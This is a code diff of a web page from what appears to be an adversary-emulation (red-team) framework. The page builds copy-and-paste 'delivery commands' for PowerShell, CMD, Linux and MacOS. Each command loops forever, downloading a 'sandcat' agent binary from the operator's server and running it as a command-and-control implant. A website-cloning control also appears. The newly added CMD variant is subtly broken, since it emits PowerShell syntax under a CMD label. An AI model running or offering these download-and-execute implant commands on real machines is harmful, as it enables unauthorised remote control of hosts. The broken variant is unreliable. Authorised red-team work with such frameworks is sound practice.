@@ -44,13 +44,16 @@
                         <div class="column section-border" style="flex:50%">
                             <h4>Option #1</h4>
                             <p class="paragraph">
-                                Copy and paste one of the delivery commands into a terminal window to start a copy of the CAT.
+                                Copy and paste one of the delivery commands into a terminal window.
                             </p>
-                            <div class="wrapper">
-                                <button id="cat1" class="button-success cat-btn" style="width:20%" onclick="show('windows')">Windows</button>
-                                <button id="cat2" class="button-success cat-btn" style="width:20%" onclick="show('linux')">Linux</button>
-                                <button id="cat3" class="button-success cat-btn" style="width:20%" onclick="show('darwin')">MacOS</button>
+                            <center>
+                            <div>
+                                <label><input type="radio" name="delivery" onclick="show('windows-psh')" />PowerShell</label>
+                                <label><input type="radio" name="delivery" onclick="show('windows-cmd')" />CMD</label>
+                                <label><input type="radio" name="delivery" onclick="show('linux')" />Linux</label>
+                                <label><input type="radio" name="delivery" onclick="show('darwin')" />MacOS</label>
                             </div>
+                            </center>
                             <div class="delivery">
                                 <code id="delivery-command"></code>
                             </div>
@@ -67,7 +70,7 @@
                             </a>
                             <br>
                             <input id="cloneNew" placeholder="Enter a url"/>
-                            <button type="button" class="button-success cat-btn" onclick="cloneWebsite()">Clone</button>
+                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
                         </div>
                     </div>
                 </div>
@@ -81,8 +84,10 @@
         function show(identity) {
             let x = $('#delivery-command');
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
-            if(identity === 'windows') {
-                x.text('while($true){$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group; sleep 60}');
+            if(identity === 'windows-psh') {
+                x.text('while($true){$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group; sleep 60}');
+            } else if(identity === 'windows-cmd') {
+                x.text('while($true) {$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executor cmd; sleep 60}')
             } else if (identity === 'linux') {
                 x.text('while true; do curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group; sleep 60; done');
             } else if (identity === 'darwin') {
